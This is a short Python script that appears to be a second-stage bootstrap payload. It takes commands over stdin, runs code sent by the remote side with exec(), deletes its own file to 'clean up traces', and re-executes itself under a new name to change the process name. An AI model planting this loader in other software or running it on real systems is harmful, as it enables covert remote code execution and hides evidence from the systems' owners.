import sys
import os
import stat


def reader():
    while 1:
        yield sys.stdin.readline()


def main():
    """Base function to boostrap payload."""
    sys.stdout.write('STAGE2' + os.linesep)
    while True:
        # read command's from remote
        cmd = sys.stdin.readline()

        # stop in case of closing channel by remote side
        if not cmd:
            break
        cmd = cmd.strip()
        cmd, separator, arg = cmd.partition(':')

        # read payload code from remote and start it
        if cmd == 'PUT':
            code = ''
            for line in reader():
                if line.strip() == 'EOF':
                    break
                code += line
            ns = {
                '__name__': '__main__'
            }
            exec(code, ns, ns)
            break

        # clean up traces
        if cmd == 'CLEAN':
            os.remove(__file__)

        # rename process by re-executing self
        if cmd == 'NAME':
            if arg:
                module_dir = os.path.dirname(__file__)
                module_path = os.path.join(module_dir, arg)
                with open(module_path, 'w') as dest:
                    dest.write('#!{} -u'.format(sys.executable) + os.linesep)
                    with open(__file__) as src:
                        dest.write(src.read())
                os.chmod(module_path, stat.S_IRWXU)
                os.remove(__file__)
                os.execl(module_path, module_path)
            else:
                # repeat stage2 message in any case
                sys.stdout.write('STAGE2' + os.linesep)


if __name__ == '__main__':
    main()
